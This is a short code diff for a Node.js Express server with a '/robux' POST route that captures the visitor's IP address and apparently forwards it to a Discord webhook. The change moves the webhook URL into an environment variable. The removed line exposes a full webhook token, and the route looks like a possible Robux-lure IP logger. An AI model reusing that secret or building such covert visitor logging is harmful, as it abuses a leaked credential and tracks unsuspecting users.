@@ -1,6 +1,7 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const axios = require("axios");
+require('dotenv').config();
 
 const app = express();
 const port = 3000;
@@ -23,7 +24,7 @@ app.post("/robux", async (req, res) => {
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
     // 디스코드 웹훅 URL
-    const webhookUrl = "https://discord.com/api/webhooks/1388633262745714750/sfb-P1jmO2bUdQI2d0z0DzfR6DVsS4jeSyIM-vrt2wEdT6yeNy1CRw8M1cvzsKDjMarO";
+    const webhookUrl = process.env.WEBHOOK_URL;
 
     const content = {
         embeds: [{
